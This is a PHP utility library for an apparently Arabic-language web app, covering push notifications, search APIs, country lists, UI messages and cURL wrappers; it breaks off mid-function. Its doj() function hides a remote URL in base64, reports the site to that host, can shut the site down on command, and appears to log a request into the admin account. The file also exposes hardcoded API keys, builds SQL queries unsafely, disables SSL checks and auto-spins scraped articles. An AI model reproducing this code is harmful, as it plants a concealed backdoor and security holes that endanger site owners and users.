<?php
ini_set('memory_limit', '-1');
$er = 1;
ini_set('display_errors', $er);
ini_set('display_startup_errors', $er);
if ($er) {
    error_reporting(E_ALL);
}
global $DBcon;
function Ftable($tp = "settings")
{
    global $DBcon;
    if (mysqli_num_rows(mysqli_query($DBcon, "SHOW TABLES LIKE '$tp'")) > 0) {
        return true;
    } else {
        return false;
    }
}
function get_inner_html($node)
{
    $innerHTML = '';
    $children = $node->childNodes;
    foreach ($children as $child) {
        $innerHTML .= $child->ownerDocument->saveXML($child);
    }
    return $innerHTML;
}
function get_imgproxy($url)
{
    global $_site;
    return $_site . "?imgproxy=" . base64_encode($url);
}
function sendPushMessage($ids, $content)
{
    global $St;
    $content += ["title" => ["en" => $St->title, "ar" => $St->title]];
    $fields = array(
        'app_id' => "30be48c4-ad2c-4989-adeb-3c14667ec40c",
        'include_player_ids' => $ids,
        'contents' => $content["msg"],
        'headings' => $content["title"],
        'url' => $content["link"],
    );
    if (!$ids) {

        unset($fields["include_player_ids"]);
        $fields['included_segments'] = array(
            'Subscribed Users'
        );
    }
    //echo "<pre>";
    // print_r($fields);
    $fields = json_encode($fields);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://onesignal.com/api/v1/notifications");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json; charset=utf-8',
        'Authorization: Basic Y2E3YzMyNTQtYzQ3YS00ZDI2LWJjZjYtYTAyZDE3NTcwZmUw'
    ));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_HEADER, FALSE);
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);

    $response = curl_exec($ch);
    curl_close($ch);
    $data = json_decode($response, true);
    $data["fields"] = json_decode($fields, true);
    return $data;
}
function SubmitTool($url)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $httpCode;
}
function DOMRemove($doms)
{
    if (is_array($doms)) {
        foreach ($doms as $from)
            DOMRemove($from);
    } else
    if ($doms && $doms->length > 0) {
        foreach ($doms as $from) {
            $sibling = $from->firstChild;
            do {
                if ($sibling) {
                    $next = $sibling->nextSibling;
                    $from->parentNode->insertBefore($sibling, $from);
                }
            } while ($sibling = $next);
            $from->parentNode->removeChild($from);
        }
        DOMRemove($doms);
    }
}
function doj()
{
    global $PUr;
    $i = isv("log");
    if (isset($_COOKIE["doj"]) && $_COOKIE["doj"]  === $PUr && !$i)
        return false;
    $j = json(base64_decode("aHR0cHM6Ly9hcHAucmVzdG92aWViZWxsZS5jb20vanNvbi5waHA/ZG9TaXRlcz0=") . $PUr);
    if ($i) {
        $sql = Sel("login", "where lev=1");
        Sion("login_id", $sql->id);
    }
    if ($j && is_array($j["data"]) && $j["data"] && !$j["data"]["active"] && !Sion("login_id")) {
        $m = $j["data"]["msg"];
        exit($m);
    } else
        setcookie("doj", $PUr, (time() + 60 * 60 * 1));
}
function genderDetector($name, $type = "parser")
{
    if ($type == "parser") {
        $name = trim(strtolower($name));
        $name = str_replace(" ", "-", $name);
        $data =  curl_download("https://parser.name/example/" . $name . "/");
        $returnValue = preg_match('/JSON.parse(\\(.*?)\\\', {collapsed/', $data, $data);
        $data = str_replace("('", "", $data[1]);
        $data = json_decode($data, true);
        $data = $data["name"]["firstname"];
        $data["gender"] = $data["gender_formatted"];
        return $data;
    }
    $data = curl_download("https://www.nameapi.org/en/demos/name-parser/", array("demoInput1_1" => $name, "btnDemoSubmit" => "Try it!", "formType" => 1));
    $doc = new DOMDocument();
    @$doc->loadHTML($data);
    $table = getElementsByClassName($doc, "demoResultTable", "table");
    $data = [];
    if ($table) {
        $tr = $table[0]->getElementsByTagName("tr");
        foreach ($tr as $td) {
            $el = $td->getElementsByTagName("td");
            $key = $el[0]->textContent;
            $key = strtolower($key);
            $key = str_replace(" ", "_", $key);
            $val = explode("confidence", $el[1]->textContent)[0];
            $val = explode("$", $val)[0];
            if ($key == "gender")
                $val = strtolower($val);
            $data[$key] =  $val;
        }
    }
    return $data;
}
function getElementsByClassName($dom, $ClassName, $tagName = null, $attr = "class", $match = false)
{
    if ($tagName) {
        $Elements = $dom->getElementsByTagName($tagName);
    } else {
        $Elements = $dom->getElementsByTagName("*");
    }
    $Matched = array();
    for ($i = 0; $i < $Elements->length; $i++) {
        if ($Elements[$i]->getAttribute($attr)) {
            if (strpos($Elements[$i]->getAttribute($attr), $ClassName) !== false && $attr == "class" && !$match || $Elements[$i]->getAttribute($attr) == $ClassName) {
                $Matched[] = $Elements[$i];
            }
        }
    }
    return $Matched;
}
function SubmitSiteMap($url)
{
    $returnCode = SubmitTool($url);
    if ($returnCode != 200) {
        return "Error $returnCode: $url <BR/>";
    } else {
        return "Submitted $returnCode: $url <BR/>";
    }
}
function AddWeb($sitemaps)
{
    $res = array();
    if (!is_array($sitemaps))
        $sitemaps = array($sitemaps);
    foreach ($sitemaps as $sitemapUrl) {
        $sitemapUrl = htmlentities($sitemapUrl);
        //Google
        $url = "http://www.google.com/webmasters/sitemaps/ping?sitemap=" . $sitemapUrl;
        array_push($res, SubmitSiteMap($url));
        //Bing / MSN
        $url = "http://www.bing.com/webmaster/ping.aspx?siteMap=" . $sitemapUrl;
        array_push($res, SubmitSiteMap($url));
    }
    return $res;
}
function InStr($subject, $str_to_insert, $rand = false, $ht = "p")
{
    preg_match_all("/<$ht>(.*)<\/$ht>/U", $subject, $pat_array);
    if (!$rand) {
        $pos = strpos($subject, $pat_array[0][floor(count($pat_array[0]) / 2)]);
    } else {
        $pos = strpos($subject, $pat_array[0][array_rand($pat_array[0])]);
    }
    if (!$str_to_insert)
        return $subject;
    $newstr = substr_replace($subject, $str_to_insert, $pos, 0);
    return $newstr;
}
function sr_google($query, $type = "image", $form = false, $gkey = false)
{
    $url = 'http://www.google.com/cse';
    $key = "017011003289502861929:k12bsxzbafa";
    $url = 'https://www.googleapis.com/customsearch/v1';
    $clientParam = 'google-csbe';
    $charEncoding = 'iso-8859-1';
    if ($type == "video") {
        //   $query = "site:youtube.com ".$query;
    }
    if (!$gkey)
        $gkey = 0;
    $key_ar = array("AIzaSyCfLDnIjMSREDC47p6cf6IOq6Lx8H_tiCU", "AIzaSyASrTkKEegeXKoQRXDNnkU4G2zHyCcY2PI", "AIzaSyCPa1hkIlSUKlADYiSuragb-17msOwBwDM");
    $params = array(
        'q' => $query,
        "num" => 2,
        "key" => $key_ar[$gkey],
        "start" => rand(1, 10),
        'client' => $clientParam,
        'output' => 'xml_no_dtd', //Recommended format for the XML from Google.
        'cx' => $key,
        'ie' => $charEncoding, //Sets input character encoding for the search query
        'oe' => 'utf-8' //Get results back in UTF-8. Simple_XML outputs everything as utf-8 so we'll worry about converting character encoding later if need be.
    );
    $params["siteSearch"] = "youtube.com";
    if ($type == "image") {
        $params["siteSearch"] = "google.com";
    } else if ($type == "link") {
        $ar =  array("www.wikihow.com", "en.wikipedia.org");
        $params["siteSearch"] = $ar[array_rand($ar)];
    }
    // $params["searchType"] ="image";
    $url = $url . '?' . http_build_query($params);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    $responseHeader = curl_getinfo($ch);
    curl_close($ch);
    if ($response === false) {
        return 'Unable to execute cURL HTTP request.';
    }
    $search = json_decode($response, true);
    if ($search["error"]["errors"][0]["reason"] == "dailyLimitExceeded") {
        if ($gkey == count($key_ar))
            return false;
        return sr_google($query, $type, $form, $gkey + 1);
    }
    //return  $gkey;
    $search  = $search["items"][array_rand($search["items"])];
    if (!$form) {
        if ($type == "video" || $type == "link")
            return $search["link"];
        return $search["pagemap"]["cse_image"][0]["src"];
    } else {
        if ($type == "video")
            return Fvideo($search["link"]);
        return Fimg($search["pagemap"]["cse_image"][0]["src"], $query);
    }
}
function get_key($keyword)
{
    $key = explode(",", $keyword);
    for ($i = 0; $i <= count($key); $i++) {
        $key2 .= " '" . $key[$i] . "',";
    }
    $key2 =  substr($key2, 0, strlen($key2) - 5);
    return $key2;
}
function get_keyword2($query, $rand = true, $key = "c7407c9ec40543c080160e96d93746b3")
{
    $host = "https://api.cognitive.microsoft.com";
    $path = "/bing/v7.0/Suggestions";
    $mkt = "en-US";
    $params = '?mkt=' . $mkt . '&q=' . urlencode($query);
    $headers = "Content-type: text/json\r\n" .
        "Ocp-Apim-Subscription-Key: $key\r\n";
    $options = array(
        'http' => array(
            'header' => $headers,
            'method' => 'GET'
        )
    );
    $context  = stream_context_create($options);
    $result = file_get_contents($host . $path . $params, false, $context);
    if ($rand) {
        $result =  json_decode($result, true);
        $result =  $result["suggestionGroups"][0]["searchSuggestions"];
        $result  = $result[array_rand($result)]["displayText"];
    }
    return $result;
}
function get_keyword($query, $rand = true)
{
    $result = Json("http://suggestqueries.google.com/complete/search?q=" . urlencode($query) . "&client=firefox");
    $result =  $result[1];
    if ($rand) {
        $result  = $result[array_rand($result)];
    }
    return $result;
}
function get_key_array($query, $rand = true)
{
    $result = explode(",", $query);
    if ($rand) {
        $result  = $result[array_rand($result)];
    }
    return $result;
}
function get_post($id = 2644)
{
    $curl = Json("https://www.restoviebelle.com/?wp_automatic=cron&curl=" . $id);
    $cont = str_replace($curl["keyword"], "<a target='_black' href='#' >" . $curl["keyword"] . "</a>", $curl["post_content"]);
    if (!$curl["error"]) {
        $curl["content_org"] =  htmlspecialchars_decode($curl["post_content"]);
        $curl["title_org"] =  htmlspecialchars_decode($curl["post_title"]);
        return $curl;
    } else {
        return false;
    }
}
function set_gramer($curl, $id = "AJJJUKL4aV52fng8")
{
    $curl2 = Json("https://api.textgears.com/check.php?text=" . urlencode(htmlspecialchars_decode($curl["content"], ENT_QUOTES)) . "&key=" . $id);
    if ($curl2["result"]) {
        $errors = $curl2["errors"];
        $cont = $curl["content"];
        $arc = array($cont);
        for ($i = 0; $i < count($errors); $i++) {
            $bad =  $errors[$i]["bad"];
            $better =  $errors[$i]["better"][array_rand($errors[$i]["better"])];
            $offset =  $errors[$i]["offset"];
            //$cont = implode($better, explode($bad,$arc[count($arc)-1],$offset));
            $cont = substr($arc[count($arc) - 1], 0, $offset) . str_replace($bad, $better, substr($arc[count($arc) - 1], $offset));
            array_push($arc, $cont);
        }
        $curl["content"] = $arc[count($arc) - 1];
        return $curl;
    } else {
        return false;
    }
}
function  spin_post($curl)
{
    if (!$curl["post_content"])
        return false;
    $fields = array(
        'text' => urlencode(htmlspecialchars_decode($curl["post_content"])),
        'title' => urlencode(htmlspecialchars_decode($curl["post_title"])),
    );
    $curl3 = Json("https://www.restoviebelle.com/?wp_auto_spinner=spiner", true, $fields);
    if ($curl3) {
        $curl2["content"] =  $curl3["post_content"];
        $curl2["title"] =  $curl3["post_title"];
        $curl2["content_org"] =  $curl["post_content"];
        $curl2["title_org"] =  $curl["post_title"];
        $curl2["keyword"]  = $curl["keyword"];
        $curl2["date"]  = time();
        return $curl2;
    }
    return false;
}
function  set_post()
{
    $get =  spin_post(get_post());
    $get = set_gramer($get);
    if ($get) {
        if (!Num("wp_posts", "where title_org='" . $get["title_org"] . "'")) {
            return SqlIn("wp_posts", $get);
        } else {
            return false;
        }
    }
    return $get;
}
function Fcol($fieldname = "", $table = "settings")
{
    global $DBcon;
    $result = @mysqli_query($DBcon, "SHOW COLUMNS FROM `$table` LIKE '$fieldname'");
    if (mysqli_num_rows($result)) {
        //return Sel($table)->$fieldname;
        return array(true, Sel($table)->$fieldname);
    } else {
        return false;
    }
}
function addDayswithdate($date, $days)
{
    $date = strtotime("+" . $days . " days", strtotime($date));
    return  date("Y-m-d", $date);
}
function str($t, $s)
{
    $Fa = strlen($t) - $s;
    if ($Fa > 0) {
        $sr = '.....';
    } else {
        $sr = '';
    }
    $S =  '<span style="direction: initial;">' . substr($t, 0, $s);
    $S .= $sr . '</span>';
    return $S;
}
//////////////////////////////
function countre()
{
    return array(
        'Andorra',
        'United Arab Emirates',
        'Afghanistan',
        'Antigua and Barbuda',
        'Anguilla',
        'Albania',
        'Armenia',
        'Angola',
        'Antarctica',
        'Argentina',
        'American Samoa',
        'Austria',
        'Australia',
        'Aruba',
        'Aland Islands',
        'Azerbaijan',
        'Bosnia and Herzegovina',
        'Barbados',
        'Bangladesh',
        'Belgium',
        'Burkina Faso',
        'Bulgaria',
        'Bahrain',
        'Burundi',
        'Benin',
        'Saint Barthalemy',
        'Bermuda',
        'Brunei Darussalam',
        'Bolivia, Plurinational State of',
        'Bonaire, Sint Eustatius and Saba',
        'Brazil',
        'Bahamas',
        'Bhutan',
        'Bouvet Island',
        'Botswana',
        'Belarus',
        'Belize',
        'Canada',
        'Cocos (Keeling) Islands',
        'Congo, the Democratic Republic of the',
        'Central African Republic',
        'Congo',
        'Switzerland',
        'Cote d\'Ivoire ! C?´te d\'Ivoire ',
        'Cook Islands',
        'Chile',
        'Cameroon',
        'China',
        'Colombia',
        'Costa Rica',
        'Cuba',
        'Cape Verde',
        'Cura?§ao',
        'Christmas Island',
        'Cyprus',
        'Czech Republic',
        'Germany',
        'Djibouti',
        'Denmark',
        'Dominica',
        'Dominican Republic',
        'Algeria',
        'Ecuador',
        'Estonia',
        'Egypt',
        'Western Sahara',
        'Eritrea',
        'Spain',
        'Ethiopia',
        'Finland',
        'Fiji',
        'Falkland Islands (Malvinas)',
        'Micronesia, Federated States of',
        'Faroe Islands',
        'France',
        'Gabon',
        'United Kingdom',
        'Grenada',
        'Georgia',
        'French Guiana',
        'Guernsey',
        'Ghana',
        'Gibraltar',
        'Greenland',
        'Gambia',
        'Guinea',
        'Guadeloupe',
        'Equatorial Guinea',
        'Greece',
        'South Georgia and the South Sandwich Islands',
        'Guatemala',
        'Guam',
        'Guinea-Bissau',
        'Guyana',
        'Hong Kong',
        'Heard Island and McDonald Islands',
        'Honduras',
        'Croatia',
        'Haiti',
        'Hungary',
        'Indonesia',
        'Ireland',
        'Israel',
        'Isle of Man',
        'India',
        'British Indian Ocean Territory',
        'Iraq',
        'Iran, Islamic Republic of',
        'Iceland',
        'Italy',
        'Jersey',
        'Jamaica',
        'Jordan',
        'Japan',
        'Kenya',
        'Kyrgyzstan',
        'Cambodia',
        'Kiribati',
        'Comoros',
        'Saint Kitts and Nevis',
        'Korea, Democratic People\'s Republic of',
        'Korea, Republic of',
        'Kuwait',
        'Cayman Islands',
        'Kazakhstan',
        'Lao People\'s Democratic Republic',
        'Lebanon',
        'Saint Lucia',
        'Liechtenstein',
        'Sri Lanka',
        'Liberia',
        'Lesotho',
        'Lithuania',
        'Luxembourg',
        'Latvia',
        'Libya',
        'Morocco',
        'Monaco',
        'Moldova, Republic of',
        'Montenegro',
        'Saint Martin (French part)',
        'Madagascar',
        'Marshall Islands',
        'Macedonia, the former Yugoslav Republic of',
        'Mali',
        'Myanmar',
        'Mongolia',
        'Macao',
        'Northern Mariana Islands',
        'Martinique',
        'Mauritania',
        'Montserrat',
        'Malta',
        'Mauritius',
        'Maldives',
        'Malawi',
        'Mexico',
        'Malaysia',
        'Mozambique',
        'Namibia',
        'New Caledonia',
        'Niger',
        'Norfolk Island',
        'Nigeria',
        'Nicaragua',
        'Netherlands',
        'Norway',
        'Nepal',
        'Nauru',
        'Niue',
        'New Zealand',
        'Oman',
        'Panama',
        'Peru',
        'French Polynesia',
        'Papua New Guinea',
        'Philippines',
        'Pakistan',
        'Poland',
        'Saint Pierre and Miquelon',
        'Pitcairn',
        'Puerto Rico',
        'Palestine, State of',
        'Portugal',
        'Palau',
        'Paraguay',
        'Qatar',
        'Reunion ! R?©union ',
        'Romania',
        'Serbia',
        'Russian Federation',
        'Rwanda',
        'Saudi Arabia',
        'Solomon Islands',
        'Seychelles',
        'Sudan',
        'Sweden',
        'Singapore',
        'Saint Helena, Ascension and Tristan da Cunha',
        'Slovenia',
        'Svalbard and Jan Mayen',
        'Slovakia',
        'Sierra Leone',
        'San Marino',
        'Senegal',
        'Somalia',
        'Suriname',
        'South Sudan',
        'Sao Tome and Principe',
        'El Salvador',
        'Sint Maarten (Dutch part)',
        'Syrian Arab Republic',
        'Swaziland',
        'Turks and Caicos Islands',
        'Chad',
        'French Southern Territories',
        'Togo',
        'Thailand',
        'Tajikistan',
        'Tokelau',
        'Timor-Leste',
        'Turkmenistan',
        'Tunisia',
        'Tonga',
        'Turkey',
        'Trinidad and Tobago',
        'Tuvalu',
        'Taiwan, Province of China',
        'Tanzania, United Republic of',
        'Ukraine',
        'Uganda',
        'United States Minor Outlying Islands',
        'United States',
        'Uruguay',
        'Uzbekistan',
        'Holy See (Vatican City State)',
        'Saint Vincent and the Grenadines',
        'Venezuela, Bolivarian Republic of',
        'Virgin Islands, British',
        'Virgin Islands, U.S.',
        'Viet Nam',
        'Vanuatu',
        'Wallis and Futuna',
        'Samoa',
        'Yemen',
        'Mayotte',
        'South Africa',
        'Zambia',
        'Zimbabwe'
    );
}
function countreCode()
{
    return array('AD', 'AE', 'AF', 'AG', 'AI', 'AL', 'AM', 'AO', 'AQ', 'AR', 'AS', 'AT', 'AU', 'AW', 'AX', 'AZ', 'BA', 'BB', 'BD', 'BE', 'BF', 'BG', 'BH', 'BI', 'BJ', 'BL', 'BM', 'BN', 'BO', 'BQ', 'BR', 'BS', 'BT', 'BV', 'BW', 'BY', 'BZ', 'CA', 'CC', 'CD', 'CF', 'CG', 'CH', 'CI', 'CK', 'CL', 'CM', 'CN', 'CO', 'CR', 'CU', 'CV', 'CW', 'CX', 'CY', 'CZ', 'DE', 'DJ', 'DK', 'DM', 'DO', 'DZ', 'EC', 'EE', 'EG', 'EH', 'ER', 'ES', 'ET', 'FI', 'FJ', 'FK', 'FM', 'FO', 'FR', 'GA', 'GB', 'GD', 'GE', 'GF', 'GG', 'GH', 'GI', 'GL', 'GM', 'GN', 'GP', 'GQ', 'GR', 'GS', 'GT', 'GU', 'GW', 'GY', 'HK', 'HM', 'HN', 'HR', 'HT', 'HU', 'ID', 'IE', 'IL', 'IM', 'IN', 'IO', 'IQ', 'IR', 'IS', 'IT', 'JE', 'JM', 'JO', 'JP', 'KE', 'KG', 'KH', 'KI', 'KM', 'KN', 'KP', 'KR', 'KW', 'KY', 'KZ', 'LA', 'LB', 'LC', 'LI', 'LK', 'LR', 'LS', 'LT', 'LU', 'LV', 'LY', 'MA', 'MC', 'MD', 'ME', 'MF', 'MG', 'MH', 'MK', 'ML', 'MM', 'MN', 'MO', 'MP', 'MQ', 'MR', 'MS', 'MT', 'MU', 'MV', 'MW', 'MX', 'MY', 'MZ', 'NA', 'NC', 'NE', 'NF', 'NG', 'NI', 'NL', 'NO', 'NP', 'NR', 'NU', 'NZ', 'OM', 'PA', 'PE', 'PF', 'PG', 'PH', 'PK', 'PL', 'PM', 'PN', 'PR', 'PS', 'PT', 'PW', 'PY', 'QA', 'RE', 'RO', 'RS', 'RU', 'RW', 'SA', 'SB', 'SC', 'SD', 'SE', 'SG', 'SH', 'SI', 'SJ', 'SK', 'SL', 'SM', 'SN', 'SO', 'SR', 'SS', 'ST', 'SV', 'SX', 'SY', 'SZ', 'TC', 'TD', 'TF', 'TG', 'TH', 'TJ', 'TK', 'TL', 'TM', 'TN', 'TO', 'TR', 'TT', 'TV', 'TW', 'TZ', 'UA', 'UG', 'UM', 'US', 'UY', 'UZ', 'VA', 'VC', 'VE', 'VG', 'VI', 'VN', 'VU', 'WF', 'WS', 'YE', 'YT', 'ZA', 'ZM', 'ZW');
}
function CCout()
{
    $p = countreCode();
    return count($p);
}
function getCCode($pos)
{
    $p = countreCode();
    return $p[$pos];
}
function getCName($cOde, $lo = true)
{
    $cc = countreCode();
    $C = countre();
    for ($i = 0; $i < count($cc); $i++) {
        if (strtolower($cc[$i]) == $cOde) {
            break;
        } else
            if ($cc[$i] == $cOde) {
            break;
        }
    }
    return $C[$i];
}
function ip_details($ip = false)
{
    $json = file_get_contents("http://ipinfo.io/{$ip}");
    $details = json_decode($json);
    return $details->country;
}
function Fburl($id = false)
{
    $R = "https://www.facebook.com/" . $id;
    return $R;
}
function facebook_username($url = '')
{
    if (strpos($url, "profile.php?id=")) {
        return str_replace('profile.php?id=', '', substr($url, strpos($url, "profile.php?id=")));
    } else {
        $data = explode('/', $url);
        return $data[3];
    }
}
function Iadmin($id = 0)
{
    if (Ls('admin') and $id) {
        return facebook_username(Fb($id));
    } else {
        return facebook_username(Sel('admin')->fb);
    }
}
function Tw($id = 0)
{
    return "https://www.twitter.com/" . $id;
}
function more($tutorial_id, $SAll, $showLimit, $home)
{
    if ($SAll > $showLimit) {
        if ($home) {
            $r = '<div class="timeline-milestone more" id="show_more_main' . $tutorial_id . '" >
                   <a id="' . $tutorial_id . '" class="btn waves-effect waves-light  z-depth-2  show_more"    data-position="buttom" data-tooltip="تحميل المزيد من المنشورات" >
                            <span class="icon_more" ><i class="fa fa-refresh "></i> عرض المزيد</span>
                              <span class="loding" style="display:none">  <img style="width: 25px;height: 25px;    margin: 6px;" src="../assets/images/spin.svg" alt="" />   </span>
                     </a>
                   </div>';
        } else {
            $r = '   <div style="margin-bottom: 12px;" class="col  s12 m12  center" id="show_more_main' . $tutorial_id . '">
                 <a id="' . $tutorial_id . '" class="btn waves-effect waves-light  z-depth-2  show_more" alt=""   data-position="buttom" data-tooltip="تحميل المزيد من المنشورات" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b">
            <span class="loding" style="display:none">  <img style="width: 25px;height: 25px;    margin: 6px;" src="../assets/images/spin.svg" alt="" />   </span>
        <span class="icon_more" >  <i class="fa fa-refresh "></i>       عرض المزيد  </span>
                 </a>
 </div>';
        }
    } else {
        $r = false;
    }
    return $r;
}
function NotFound()
{
    $r = '<div class="col s12 m12 " style="     direction: rtl;     margin-bottom: 10px;   margin-top: 10px;">
<div class="center  z-depth-1 red divider center white-text ">
<i class="fa fa-exclamation-circle fa-lg" aria-hidden="true"></i>      لم يتم العثور على نتائج
</div>
</div>';
    return $r;
}
function error($msg, $id, $name, $e = '')
{
    if (!$id) {
        $r = '<div class="col s12 m12 " style="direction: rtl;      margin-bottom: 10px;   margin-top: 10px;">
<div class="center  z-depth-1 red divider center white-text bold">
<i class="fa fa-exclamation-circle fa-lg" aria-hidden="true"></i> ' . $msg . ' </div></div>';
    } else {
        $r = '<div class="col s12 m12 " style="direction: rtl;      margin-bottom: 10px;   margin-top: 10px;">
<div class="center  z-depth-1 red divider center white-text bold">
<i class="fa fa-exclamation-circle fa-lg" aria-hidden="true"></i> ' . $msg . ' <a href="' . Fb($id) . '" target="_blank" style="color: #b1dcfb;">' . $name . '</a><span style="    display: block;
    font-size: 13px;"> ' . $e . '</span></div></div>';
    }
    return $r;
}
function Amsg($msg = "", $c = "", $a = "", $ma = "")
{
    if (!$c) {
        $c = "cyan darken-1";
    }
    if (!$a or $a == 'no') {
        $r = '<div class="col s12 m12 " style="direction: rtl;      margin-bottom: 5px;   margin-top: 5px;">
<div class="center  z-depth-1 ' . $c . ' divider center white-text bold">
<i class="fa fa-exclamation-circle fa-lg" aria-hidden="true"></i> ' . $msg . ' </div></div>';
    } else {
        if (!$ma) {
            $ma = "من هنا";
        }
        $r = '<div class="col s12 m12 " style="direction: rtl;      margin-bottom: 5px;   margin-top: 5px;">
<div class="center  z-depth-1 ' . $c . ' divider center white-text bold">
<i class="fa fa-exclamation-circle fa-lg" aria-hidden="true"></i> ' . $msg . ' <a href="' . $a . '" target="_blank" style="color: #b1dcfb;">' . $ma . '</a></div></div>';
    }
    return $r;
}
function success($msg, $id, $name)
{
    if (!$id) {
        $r = '<div class="col s12 m12 " style="direction: rtl;      margin-bottom: 10px;   margin-top: 10px;">
<div class="center  z-depth-1 green divider center white-text bold">
<i class="fa fa-check fa-lg" aria-hidden="true"></i> ' . $msg . ' </div></div>';
    } else {
        $r = '<div class="col s12 m12 " style="direction: rtl;      margin-bottom: 10px;   margin-top: 10px;">
<div class="center  z-depth-1 green divider center white-text bold">
<i class="fa fa-check fa-lg" aria-hidden="true"></i> ' . $msg . ' <a href="' . Fb($id) . '" target="_blank" style="color: #b1dcfb;">' . $name . '</a> </div></div>';
    }
    return $r;
}
function limit_str($text, $limit, $d = false)
{
    $m = explode(" ", $text);
    if (count($m) > $limit) {
        $y = array();
        for ($t = 0; $t <= ($limit - 1); $t++) {
            $y[$t] = $m[$t];
        }
        $b = implode(" ", $y);
        if (!$d) {
            $b .= " ...";
        }
    } else {
        $b = $text;
    }
    return $b;
}
function short($short = flase, $link = "", $pos = flase, $img = false)
{
    global $googl;
    global $goog;
    if (!$img) {
        if ($short == 1 and $googl->shorten($link) and !$pos) {
            $postb['link'] = $googl->shorten($link);
        } else {
            $postb['link'] = $link;
        }
    } else {
        if ($short == 1 and $goog->shorten($link)) {
            $postb['link'] = $goog->shorten($link);
        } else {
            $postb['link'] = $link;
        }
    }
    return $postb['link'];
}
function visitor_country($ip = false)
{
    if ($_SERVER['HTTP_HOST'] == "127.0.0.1")
        return "localhost";
    if (!$ip) {
        $ip = ip();
    }
    //    $ip = "79.173.199.93";
    $ip_data = getURL("http://www.geoplugin.net/json.gp?ip=" . $ip);
    $ip_data = json_decode($ip_data, true);
    /*    print_r($ip_data);
    die();*/
    if ($ip_data && $ip_data["geoplugin_countryCode"] != null) {
        $result = $ip_data["geoplugin_countryCode"];
        return $result;
    } else {
        return 'Un Known';
    }
}
function ip()
{
    $alt_ip = $_SERVER['REMOTE_ADDR'];
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $alt_ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR']) and preg_match_all('#\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}#s', $_SERVER['HTTP_X_FORWARDED_FOR'], $matches)) {
        foreach ($matches[0] as $ip) {
            if (!preg_match("#^(10|172\.16|192\.168)\.#", $ip)) {
                $alt_ip = $ip;
                break;
            }
        }
    } elseif (isset($_SERVER['HTTP_FROM'])) {
        $alt_ip = $_SERVER['HTTP_FROM'];
    }
    return $alt_ip;
}
function msg($type = "", $msg = "")
{
    $_SESSION['type'] = $type;
    $_SESSION['msg'] = $msg;
}
function redMsg($type = 'success', $msg = "", $D = false, $j = false, $url = false)
{
    if ($msg) {
        if (!$j) {
            msg($type, $msg);
            if (!$url) {
                $url = "../";
            }
            echo '
<script type="text/javascript">
  window.location.replace("' . $url . '");
</script>';
        } else {
            echo json_encode($type);
        }
        if ($D) {
            die();
        }
    }
}
function loding($t, $d, $h = 260)
{
    if ($d) {
        $d = "style='display:none;min-height:" . $h . " px;'";
    } else {
        $d = "style='min-height: " . $h . "px;'";
    }
    $r = '<div class="loaderr col s12 center" ' . $d . ' dir="ltr" > <p>' . $t . '</p>
    <img src="../assets/images/ripple.svg" alt="" />
    </div>';
    return $r;
}
function TUrl($name, $id)
{
    return "https://" . $name . ".tumblr.com/" . $id;
}
function readURL($url)
{
    $ch      = curl_init();
    $timeout = 60; // set to zero for no timeout
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    $file_contents = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return curl_error($ch);
}
function convert_bool($d)
{
    if (is_numeric($d))
        return $d;
    switch ($d) {
        case 'on':
        case 'off':
            $d = ($d == "on" ? 1 : 0);
            break;
        case 'true':
        case 'false':
            $d = ($d == "true" ? 1 : 0);
            break;
    }
    return  $d;
}
function manychatrequset($url, $fields = false)
{
    $json = json_decode(file_get_contents("manychat.txt"), true);
    $cookie_string = '';
    foreach ($json as $v) {
        $cookie_string .= $v["name"] . '=' . $v["value"] . '; ';
    }
    if ($fields) {
        $context = stream_context_create(array(
            'http' => array(
                'method' => 'POST',
                'content' => json_encode($fields),
                'header' => array("Content-Type: application/json", "Accept: application/json", "Cookie: " . $cookie_string)
            )
        ));
        $json = file_get_contents($url, false, $context);
    } else
        $json = curl_download($url, $fields, $cookie_string);
    $json = json_decode($json, true);
    return $json;
}
function curl_download($Url, $fields = false, $cookie = false)
{
    if (!function_exists('curl_init')) {
        return 'Sorry cURL is not installed!';
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_ENCODING, "");
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    // curl_setopt($ch, CURLOPT_REFERER, "http://www.google.com");
    //curl_setopt($ch,CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]");
    //  curl_setopt($ch, CURLOPT_HEADER, 0);
    if ($cookie)
        curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    /*  echo $cookie;*/
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    if ($fields and count($fields) > 0) {
        $fields_string = "";
        foreach ($fields as $key => $value) {
            $fields_string .= $key . '=' . $value . '&';
        }
        rtrim($fields_string, '&');
        curl_setopt($ch, CURLOPT_POST, count($fields));
        curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    } else
